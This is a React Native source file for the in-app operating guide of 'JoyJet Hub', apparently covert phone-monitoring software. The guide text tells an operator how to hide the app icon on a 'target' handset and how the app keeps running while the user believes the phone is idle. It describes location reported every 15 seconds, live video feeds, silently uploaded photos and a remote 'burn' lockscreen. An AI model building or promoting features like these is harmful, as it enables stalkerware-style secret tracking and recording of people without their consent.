import React from 'react';
import { 
  View, Text, StyleSheet, ScrollView, TouchableOpacity, SafeAreaView, StatusBar 
} from 'react-native';
import { MaterialCommunityIcons } from '@expo/vector-icons';

const GuideScreen = ({ onBack }) => {
  const sections = [
    {
      title: "STEALTH OPERATIONS",
      icon: "incognito-circle",
      color: "#F59E0B",
      items: [
        { label: "CLOAKING HINT", desc: "For full Launcher Hiding (removing the icon from the phone's grid), go to Settings > Home Screen > Hide Apps. In advanced 'Custom Rom' builds, we use a hidden boot sequence during initial deployment." },
        { label: "BACKGROUND PERSISTENCE", desc: "Our 'Stealth Cloak' button doesn't close the engine. It merely detaches the UI. The node will continue heartbeating even if the user thinks the phone is off or on the home screen." }
      ]
    },
    {
      title: "THE FINAL BURN (UNINSTALL)",
      icon: "trash-can-outline",
      color: "#EF4444",
      items: [
        { label: "LOGICAL DISCARD", desc: "Remote BURN is the ultimate command. Once issued, the node is PURGED from our database forever. It's the logical equivalent of discarding the device." },
        { label: "PHYSICAL CLEANUP", desc: "Due to Android's hard security protocols, NO APP can silently uninstall itself without user interaction. To truly wipe binary traces, you MUST perform a manual Settings > Apps > JOYJET > Uninstall on the target physical handset." },
        { label: "LOCK-DOWN STATE", desc: "A burned node instantly turns into a Red Terminal Lockscreen on the target device, displaying a 'Skull' icon. This prevents the user from re-linking the app without fresh credentials." }
      ]
    },
    {
      title: "UPLINK STATUS (TRAFFIC LIGHTS)",
      icon: "traffic-light",
      color: "#10B981",
      items: [
        { label: "🟢 GREEN (ACTIVE)", desc: "Full power. Node is transmitting location every 15s and supporting live video feeds." },
        { label: "🟠 ORANGE (PAUSED)", desc: "Power-save mode. WebRTC bridge is closed. GPS suspended for battery conservation." },
        { label: "🔴 RED (TERMINATED)", desc: "Node is dark. Either disconnected, or permanently BURNED from the grid." }
      ]
    },
    {
      title: "ADMIN TACTICAL CONTROLS",
      icon: "security-network",
      color: "#38BDF8",
      items: [
        { label: "PAUSE/RESUME", desc: "Toggle the 'PAUSE' button to put the target's power management into deep sleep without severing the link." },
        { label: "REMOTE EVIDENCE", desc: "Request silently uploaded 'REMOTE SNAPS' (uploaded to Snaps tab) or 'CAPTURE FEED' (saved to your dashboard device)." }
      ]
    }
  ];
    
      return (
        <SafeAreaView style={styles.container}>
          <StatusBar barStyle="light-content" backgroundColor="#0F172A" />
          
          <View style={styles.header}>
            <TouchableOpacity style={styles.backBtn} onPress={onBack}>
              <MaterialCommunityIcons name="chevron-left" size={24} color="#38BDF8" />
              <Text style={styles.backTxt}>BACK</Text>
            </TouchableOpacity>
            <Text style={styles.headerTitle}>HUB GUIDE</Text>
            <View style={{ width: 60 }} />
          </View>
    
          <ScrollView style={styles.content} showsVerticalScrollIndicator={false}>
            <View style={styles.hero}>
              <MaterialCommunityIcons name="book-open-variant" size={48} color="#38BDF8" />
              <Text style={styles.heroTitle}>OPERATIONAL MANUAL</Text>
              <Text style={styles.heroSub}>JoyJet Hub Secure Infrastructure v4.3.0</Text>
            </View>
    
            {sections.map((section, idx) => (
              <View key={idx} style={styles.section}>
                <View style={styles.sectionHeader}>
                  <MaterialCommunityIcons name={section.icon} size={20} color={section.color} />
                  <Text style={[styles.sectionTitle, { color: section.color }]}>{section.title}</Text>
                </View>
                <View style={styles.card}>
                  {section.items.map((item, iIdx) => (
                    <View key={iIdx} style={[styles.item, iIdx < section.items.length - 1 && styles.border]}>
                      <Text style={[styles.itemLabel, { color: section.color }]}>{item.label}</Text>
                      <Text style={styles.itemDesc}>{item.desc}</Text>
                    </View>
                  ))}
                </View>
              </View>
            ))}
    
            <View style={styles.footer}>
              <Text style={styles.footerText}>ENCRYPTED PROTOCOL 2026 • JOYJET SYSTEMS</Text>
            </View>
            <View style={{ height: 40 }} />
          </ScrollView>
        </SafeAreaView>
      );
    };
    
    const styles = StyleSheet.create({
      container: { flex: 1, backgroundColor: '#0F172A' },
      header: { 
        height: 60, 
        flexDirection: 'row', 
        alignItems: 'center', 
        justifyContent: 'space-between', 
        paddingHorizontal: 16,
        backgroundColor: '#1E293B',
        borderBottomWidth: 1,
        borderBottomColor: '#334155'
      },
      backBtn: { flexDirection: 'row', alignItems: 'center', width: 60 },
      backTxt: { color: '#38BDF8', fontSize: 12, fontWeight: '700', marginLeft: -4 },
      headerTitle: { color: '#F8FAFC', fontSize: 14, fontWeight: '800', letterSpacing: 2 },
    
      content: { flex: 1, padding: 20 },
      hero: { alignItems: 'center', marginBottom: 32, marginTop: 10 },
      heroTitle: { color: '#F8FAFC', fontSize: 20, fontWeight: '900', letterSpacing: 1, marginTop: 12 },
      heroSub: { color: '#64748B', fontSize: 12, marginTop: 4, fontWeight: '600' },
    
      section: { marginBottom: 24 },
      sectionHeader: { flexDirection: 'row', alignItems: 'center', marginBottom: 12, paddingLeft: 4 },
      sectionTitle: { fontSize: 11, fontWeight: '800', letterSpacing: 1.5, marginLeft: 8 },
      
      card: { backgroundColor: '#1E293B', borderRadius: 16, borderWidth: 1, borderColor: '#334155', overflow: 'hidden' },
      item: { padding: 16 },
      border: { borderBottomWidth: 1, borderBottomColor: '#273549' },
      itemLabel: { fontSize: 13, fontWeight: '800', marginBottom: 6, letterSpacing: 0.5 },
      itemDesc: { color: '#94A3B8', fontSize: 11, lineHeight: 18 },
    
      footer: { alignItems: 'center', marginTop: 20, opacity: 0.5 },
      footerText: { color: '#64748B', fontSize: 9, fontWeight: '700', letterSpacing: 1 }
    });

export default GuideScreen;
